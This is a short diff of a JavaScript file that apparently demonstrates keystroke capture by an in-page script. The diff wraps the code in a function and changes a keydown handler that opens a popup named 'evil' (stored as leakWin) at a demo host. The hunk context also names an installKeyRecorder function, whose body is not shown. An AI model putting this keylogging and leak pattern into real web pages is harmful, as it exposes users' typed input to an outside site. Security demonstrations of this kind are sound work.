@@ -1,3 +1,6 @@
+(function() {
+
+
 var viewportwidth = document.documentElement.clientWidth;
 let leakWin;
 
@@ -11,7 +14,7 @@ while(match = regex.exec(url)) {
 
 window.addEventListener('keydown', function(evt) {
   if (evt.key === '-') {
-    leakWin = window.open("http://www.thinkfu.com/sagemart.html", "evil", "menubar=no,location=no,resizable=yes,scrollbars=yes,status=no,height=700,width=500,left=" + (viewportwidth - 500));
+    leakWin = window.open("https://instartlogic.github.io/demo/sagemart.html", "evil", "menubar=no,location=no,resizable=yes,scrollbars=yes,status=no,height=700,width=500,left=" + (viewportwidth - 500));
     //let leakWin = window.open("/js/third_party/leak.html", "evil", "menubar=no,location=no,resizable=yes,scrollbars=yes,status=no,height=700,width=500,left="+(viewportwidth-500));
   }
 });
@@ -139,4 +142,6 @@ function installKeyRecorder(evt, field) {
   }
   return result;
 }
+})();
+
 
